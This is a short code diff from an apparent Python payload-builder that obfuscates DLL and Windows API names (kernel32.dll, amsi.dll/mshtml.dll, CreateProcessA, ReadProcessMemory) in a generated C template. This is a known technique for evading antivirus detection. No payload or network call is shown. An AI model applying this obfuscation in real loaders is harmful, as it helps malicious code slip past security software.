@@ -133,7 +133,7 @@ def run(fileName, encKey, output):
 
     display_info("Obfuscate Modules and APIs")
     template = template.replace('"kernel32.dll"', obfuscate_and_convert_data_to_c_fmt("kernel32.dll", key))
-    template = template.replace('"amsi.dll"', obfuscate_and_convert_data_to_c_fmt("amsi.dll", key))
+    template = template.replace('"mshtml.dll"', obfuscate_and_convert_data_to_c_fmt("mshtml.dll", key))
     template = template.replace('"CreateFileA"', obfuscate_and_convert_data_to_c_fmt("CreateFileA", key))
     template = template.replace('"CreateProcessA"', obfuscate_and_convert_data_to_c_fmt("CreateProcessA", key))
     template = template.replace('"ReadProcessMemory"', obfuscate_and_convert_data_to_c_fmt("ReadProcessMemory", key))
